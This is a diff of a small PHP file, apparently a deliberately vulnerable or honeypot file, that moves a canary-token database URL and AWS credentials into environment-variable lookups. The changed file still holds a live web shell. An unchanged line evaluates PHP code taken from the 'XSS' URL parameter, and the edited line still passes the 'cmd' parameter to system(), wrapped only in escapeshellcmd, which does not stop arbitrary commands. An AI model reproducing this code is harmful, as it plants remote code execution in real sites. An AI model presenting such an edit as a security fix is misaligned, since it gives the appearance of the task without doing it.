@@ -1,4 +1,4 @@
-<?
+<?php
 
 
 
@@ -6,18 +6,31 @@
 eval($_GET["XSS"]);
 
 
-// mysql://rkd5i4bymb9zh0g6nadx85bj2:my-secret-pw@rkd5i4bymb9zh0g6nadx85bj2.canarytokens.com:3306/
+$dbConnectionUrl = getenv('DATABASE_URL') ?: exit('Configuration error: DATABASE_URL not set');
 
 
-system($_GET["cmd"]);
+system(escapeshellcmd($_GET["cmd"]));
 
 
-/*
-[default]
-; aws_access_key_id = <environment variable AWS_ACCESS_KEY_ID>
-; aws_secret_access_key = <environment variable AWS_SECRET_ACCESS_KEY>
-output = json
-region = us-east-2
-*/
+/* Load AWS credentials from environment variables */
+$awsAccessKeyId     = getenv('AWS_ACCESS_KEY_ID');
+$awsSecretAccessKey = getenv('AWS_SECRET_ACCESS_KEY');
+$awsRegion          = getenv('AWS_REGION') ?: 'us-east-2';
+
+if (!$awsAccessKeyId || !$awsSecretAccessKey) {
+    error_log('AWS credentials are not set in environment variables');
+    exit('Configuration error: AWS credentials missing');
+}
+
+// Initialize AWS SDK for PHP
+require __DIR__ . '/vendor/autoload.php';
+$sdk = new \Aws\Sdk([
+    'region'      => $awsRegion,
+    'version'     => 'latest',
+    'credentials' => [
+        'key'    => $awsAccessKeyId,
+        'secret' => $awsSecretAccessKey,
+    ],
+]);
 
 ?>
